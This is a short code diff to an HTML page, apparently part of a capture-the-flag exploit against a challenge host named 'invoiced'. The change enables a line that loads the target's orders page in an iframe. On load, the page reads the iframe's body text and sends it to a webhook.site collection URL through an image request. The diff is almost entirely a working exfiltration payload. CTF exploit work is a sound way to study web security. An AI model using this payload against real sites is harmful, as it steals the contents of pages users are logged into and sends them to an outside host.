@@ -8,7 +8,7 @@
         <img id="img">
         <script>
         const iframe = document.getElementById("iframe");
-        //iframe.src = "http://invoiced.chal-kalmarc.tf/orders";
+        iframe.src = "http://invoiced.chal-kalmarc.tf/orders";
         iframe.onload = () => {
             document.getElementById('img').src = 'https://webhook.site/7938f089-b608-4c96-9470-127658edfb66?test='+iframe.contentWindow.document.body.textContent;};
 
